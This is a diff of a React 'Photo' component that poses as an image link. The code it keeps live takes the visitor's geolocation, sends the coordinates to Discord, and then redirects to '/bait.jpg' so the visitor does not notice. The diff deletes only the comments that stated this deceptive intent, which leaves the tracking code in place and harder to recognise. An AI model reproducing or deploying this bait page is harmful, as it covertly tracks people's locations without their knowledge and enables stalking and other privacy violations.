@@ -10,7 +10,6 @@ export default function Photo() {
           sendToDiscord(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
         },
         (err) => {
-          // If they deny, just show a broken image
           window.location.href = '/bait.jpg'; 
         }
       );
@@ -42,14 +41,13 @@ export default function Photo() {
       })
     });
 
-    // Instantly redirect to the actual image so they don't get suspicious
     window.location.href = '/bait.jpg'; 
   };
 
   return (
     <div style={{ 
       display: 'flex', height: '100vh', width: '100vw', 
-      background: '#000000' // Pitch black background
+      background: '#000000' 
     }}>
     </div>
   );
